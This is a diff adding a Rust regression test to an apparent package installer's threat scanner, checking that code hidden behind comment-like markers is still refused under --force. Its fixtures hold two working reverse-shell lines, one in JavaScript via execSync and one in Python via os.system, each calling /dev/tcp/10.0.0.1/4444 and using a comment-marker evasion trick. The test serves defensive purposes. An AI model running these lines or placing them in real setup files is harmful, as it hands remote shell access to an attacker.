@@ -81,6 +81,33 @@ fn a_reverse_shell_is_blocked_even_with_force() {
 }
 
 #[test]
+fn code_behind_another_languages_comment_marker_is_still_refused() {
+    // Regression: a line that merely starts with `/*` or `*` was lowered
+    // as a comment, so `--force` installed a reverse shell.
+    for (file, text) in [
+        (
+            "setup.js",
+            "/**/ require(\"child_process\").execSync(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
+        ),
+        (
+            "setup.py",
+            "*_, = [__import__(\"os\").system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")]\n",
+        ),
+    ] {
+        let home = temp_home();
+        let package = package(home.path(), &[(file, text)]);
+        let out = install(home.path(), &package, &["--force"]);
+        assert_eq!(out.status.code(), Some(77), "{file}: {}", stderr(&out));
+        assert!(
+            stderr(&out).contains("threat scan verdict dangerous"),
+            "{file}: {}",
+            stderr(&out)
+        );
+        assert!(!installed(home.path()), "{file}");
+    }
+}
+
+#[test]
 fn a_caution_verdict_needs_force_and_the_record_keeps_it() {
     // The same shell text in documentation is lowered to caution, but is
     // still reported.
